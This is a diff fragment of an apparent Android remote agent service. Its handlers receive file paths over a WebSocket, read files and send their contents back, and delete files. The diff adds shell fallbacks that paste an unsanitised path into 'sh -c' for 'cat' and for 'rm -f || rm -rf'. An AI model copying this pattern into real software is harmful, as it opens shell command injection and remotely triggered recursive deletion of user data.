+                } catch (Throwable t) {
+                    data = null;
+                }
             }
-            fis.close();
+
+            if (data == null) {
+                // Shell fallback read via /system/bin/cat
+                try {
+                    Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", "cat \"" + targetPath + "\""});
+                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                    InputStream is = p.getInputStream();
+                    byte[] buf = new byte[8192];
+                    int r;
+                    while ((r = is.read(buf)) != -1) {
+                        baos.write(buf, 0, r);
+                    }
+                    is.close();
+                    p.waitFor();
+                    if (baos.size() > 0) {
+                        data = baos.toByteArray();
+                        fileLen = data.length;
+                    }
+                } catch (Throwable ignored) {}
+            }
+
+            if (data == null) {
+                resp.put("success", false);
+                resp.put("error", "File is not readable (Permission Denied). Please ensure 'All Files Access' is granted.");
+                if (wsClient != null && wsClient.isConnected()) wsClient.send(resp.toString());
+                return;
+            }
 
             resp.put("success", true);
             resp.put("name", f.getName());
@@ -2304,11 +2479,17 @@ public class AgentService extends Service implements WebSocketClient.Listener {
             File f = new File(targetPath);
             if (!f.exists()) {
                 resp.put("success", false);
-                resp.put("error", "File does not exist");
+                resp.put("error", "File does not exist: " + targetPath);
             } else {
                 boolean del = f.delete();
+                if (!del) {
+                    try {
+                        Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", "rm -f \"" + targetPath + "\" || rm -rf \"" + targetPath + "\""});
+                        del = (p.waitFor() == 0);
+                    } catch (Throwable ignored) {}
+                }
                 resp.put("success", del);
-                if (!del) resp.put("error", "Could not delete file (Read-only or in use)");
+                if (!del) resp.put("error", "Could not delete file (Read-only or permission restricted)");
             }
         } catch (Throwable t) {
             try {
